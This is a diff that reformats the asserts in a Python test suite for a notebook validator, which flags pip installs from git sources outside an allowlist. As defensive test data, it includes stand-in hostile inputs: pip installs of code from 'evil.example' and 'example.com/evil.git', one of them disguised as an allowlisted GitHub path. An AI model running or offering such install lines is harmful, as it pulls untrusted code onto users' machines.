@@ -1096,9 +1096,10 @@ def test_git_allowlist_matches_the_repository_not_a_substring():
     is compared against the normalised host and path."""
     nv = _load_notebook_validator_module()
 
-    assert nv._git_source_repository(
-        "git+https://user:pw@github.com/state-spaces/mamba.git@v2.0"
-    ) == "github.com/state-spaces/mamba"
+    assert (
+        nv._git_source_repository("git+https://user:pw@github.com/state-spaces/mamba.git@v2.0")
+        == "github.com/state-spaces/mamba"
+    )
     assert nv._git_source_is_allowed("git+https://github.com/unslothai/unsloth-zoo.git")
     assert not nv._git_source_is_allowed(
         "git+https://evil.example/repo/github.com/unslothai/unsloth.git"
@@ -1108,9 +1109,12 @@ def test_git_allowlist_matches_the_repository_not_a_substring():
     assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(smuggled, "nb.ipynb", 0))
 
     # Credentials and a trailing ref do not stop an allowlisted repository from matching.
-    assert nv.rule_inst_001_git_plus(
-        "!pip install git+https://user:pw@github.com/state-spaces/mamba.git@v2.0", "nb.ipynb", 0
-    ) == []
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!pip install git+https://user:pw@github.com/state-spaces/mamba.git@v2.0", "nb.ipynb", 0
+        )
+        == []
+    )
 
 
 def test_git_ban_reads_commands_not_the_comment():
@@ -1118,13 +1122,19 @@ def test_git_ban_reads_commands_not_the_comment():
     documentation and must not fail the notebook."""
     nv = _load_notebook_validator_module()
 
-    assert nv.rule_inst_001_git_plus(
-        "!pip install foo # avoid git+https://example.com/evil.git", "nb.ipynb", 0
-    ) == []
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!pip install foo # avoid git+https://example.com/evil.git", "nb.ipynb", 0
+        )
+        == []
+    )
     # The executable half of the same line still counts.
-    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(
-        "!pip install git+https://example.com/evil.git # needed", "nb.ipynb", 0
-    ))
+    assert any(
+        f.rule == "R-INST-001"
+        for f in nv.rule_inst_001_git_plus(
+            "!pip install git+https://example.com/evil.git # needed", "nb.ipynb", 0
+        )
+    )
 
 
 def test_notebook_validator_ends_a_grouped_and_or_list_at_its_own_operator():
@@ -1134,9 +1144,7 @@ def test_notebook_validator_ends_a_grouped_and_or_list_at_its_own_operator():
 
     same_list = '!(pip install foo || pip install bar && pip install "torch==2.12.0")'
     assert [flag for _, flag in nv._split_chained(same_list)] == [False, True, False]
-    assert len(
-        nv.rule_inst_004_torchcodec_torch(same_list, COLAB_TORCH211, "nb.ipynb", 0)
-    ) == 1
+    assert len(nv.rule_inst_004_torchcodec_torch(same_list, COLAB_TORCH211, "nb.ipynb", 0)) == 1
 
     inner = '!pip install foo || (pip install bar && pip install "torch==2.12.0")'
     assert [flag for _, flag in nv._split_chained(inner)] == [False, True, True]
@@ -1157,15 +1165,16 @@ def test_notebook_validator_keeps_a_minor_a_narrow_exclusion_cannot_remove():
         '!pip install "torchcodec>=0.11,<0.12,!=0.11.0"',
         '!pip install "torchcodec>=0.11,<=0.11.1,!=0.11"',
     ):
-        assert len(
-            nv.rule_inst_004_torchcodec_torch(cell, older, "nb.ipynb", 0)
-        ) == 1, cell
+        assert len(nv.rule_inst_004_torchcodec_torch(cell, older, "nb.ipynb", 0)) == 1, cell
 
     # A wildcard over the minor still clears it.
     newer = {"torch": "2.10.0+cu128", "torchcodec": "0.15.0"}
-    assert nv.rule_inst_004_torchcodec_torch(
-        '!pip install "torchcodec>=0.10,<0.12,!=0.11.*"', newer, "nb.ipynb", 0
-    ) == []
+    assert (
+        nv.rule_inst_004_torchcodec_torch(
+            '!pip install "torchcodec>=0.10,<0.12,!=0.11.*"', newer, "nb.ipynb", 0
+        )
+        == []
+    )
 
 
 def test_notebook_validator_reads_a_range_as_one_window():
